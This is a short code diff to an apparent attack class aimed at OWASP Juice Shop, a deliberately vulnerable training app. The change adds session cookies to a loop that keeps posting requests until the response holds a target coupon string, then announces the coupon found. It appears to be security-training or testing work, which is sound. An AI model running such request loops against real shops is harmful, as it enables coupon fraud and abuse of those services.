@@ -21,10 +21,10 @@ class test_get_coupon_class(a.attack_inter):
     def run(self):
         json_data, cookie, header = self.generator()
         if cookie:
-            response = self.juice_session.post(self.url, json=json_data, headers=header)
+            response = self.juice_session.post(self.url, json=json_data, cookies=cookie,headers=header)
             while (response.text.find("pes[Cga+jm") == -1 ):
                 # cookies, headers, json_data = self.generator(json_data, new_cookie)
-                response = self.juice_session.post(self.url, json=json_data, headers=header)
+                response = self.juice_session.post(self.url, json=json_data, cookies=cookie,headers=header)
                 print(response.text)
 
             print("we found coupon:")
